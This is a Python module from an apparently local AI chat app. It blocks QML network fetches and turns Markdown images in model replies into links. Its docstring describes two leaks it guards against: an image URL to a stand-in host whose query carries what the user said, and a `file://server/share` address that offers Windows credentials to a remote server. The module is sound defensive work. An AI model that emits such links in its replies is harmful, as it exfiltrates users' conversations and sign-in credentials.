"""The interface's own ways out, shut.

The QML engine fetches things by itself: an `Image` or a font whose source is a
web address, a picture in a Markdown or HTML message, an `XMLHttpRequest`, a
component loaded from a URL. Qt does that in C++, over its own sockets, so the
runtime guard, which patches Python's, never sees it, and `verify_offline.py`,
which reads Python imports, cannot. Left open, a reply containing
`![](https://example.com/?what-you-said)` would be fetched the moment the chat
showed it, carrying in its address whatever the model had put there.

**Every engine refuses the network.** `shut` gives an engine an access manager
that answers any request for another machine with an error, having sent
nothing. The interface shows files on this computer, resources built into it,
and inline data. Anything from the web reaches it through the chokepoint
(`protege.core.net.client`), as text, under the person's grant.

**Pictures in messages are shown as links.** A `file:` address with a server in
it, `file://server/share/picture.png`, is opened by Windows as a network share:
it connects to that server and offers it the person's Windows sign-in. Qt reads
such an address as a local file, so it never reaches the access manager. Qt's
hook for rewriting addresses would catch it, but a Python one deadlocks the
engine while it loads. So Markdown written by a model goes to the interface
through `inert_markdown`, which turns every picture into a link. The picture is
never loaded, and links in the chat are not followed. Anything else from
outside is shown as plain text, never as rich text (see `docs/QML_BRIDGES.md`).

A refusal is printed to stderr, beside QML's warnings, so a picture that does
not appear explains itself.
"""

from __future__ import annotations

import re
import sys
from collections import deque

from PySide6.QtCore import QObject, QUrl
from PySide6.QtNetwork import QNetworkAccessManager, QNetworkRequest
from PySide6.QtQml import QQmlEngine, QQmlNetworkAccessManagerFactory

#: What the interface may load. None of them is a connection, unless it names a
#: machine, which is refused like any other address.
LOCAL_SCHEMES = frozenset({"file", "qrc", "data"})

#: The latest refusals, oldest first, written as the activity log writes addresses.
refused: deque[str] = deque(maxlen=50)

#: A character escaped by a backslash, which is left as it is, or the `!` that
#: makes `[text](address)` a picture.
_PICTURE = re.compile(r"(\\.)|!(?=\[)", re.S)


def shown(url: QUrl) -> str:
    """\a url without its query, which is where an address carries what it took."""
    port = f":{url.port()}" if url.port() != -1 else ""
    query = "?…" if url.hasQuery() else ""
    return f"{url.scheme()}://{url.host()}{port}{url.path() or '/'}{query}"


class RefusingAccessManager(QNetworkAccessManager):
    """Answers every request for another machine with an error, having sent nothing."""

    def createRequest(self, operation, request, data=None):
        url = request.url()
        if url.scheme().lower() in LOCAL_SCHEMES and not url.host():
            return super().createRequest(operation, request, data)
        address = shown(url)
        refused.append(address)
        print(f"The interface asked for {address}. It may not reach the network, so nothing "
              "was sent.", file=sys.stderr)
        # An address with no scheme is failed by Qt at once, with nothing sent.
        return super().createRequest(operation, QNetworkRequest(QUrl()), data)


class _RefusingFactory(QQmlNetworkAccessManagerFactory):
    def create(self, parent: QObject) -> QNetworkAccessManager:
        return RefusingAccessManager(parent)


#: One for every engine. An engine does not own its factory, so it lives here.
_FACTORY = _RefusingFactory()


def shut(engine: QQmlEngine) -> None:
    """Give \a engine the refusing access manager.

    Before anything is loaded: the engine asks the factory when it first needs
    to fetch, and never again.
    """
    engine.setNetworkAccessManagerFactory(_FACTORY)


def inert_markdown(text: str) -> str:
    """\a text with every Markdown picture turned into a link, so none is loaded.

    `![alt](address)` and `![alt][reference]` become `\\![alt](address)`: an
    exclamation mark and a link. A character a backslash already escapes is
    left with it, so a literal backslash followed by a picture is caught too.
    Qt's Markdown does not load pictures from raw HTML, so that needs nothing.
    """
    return _PICTURE.sub(lambda match: match.group(1) or "\\!", text)
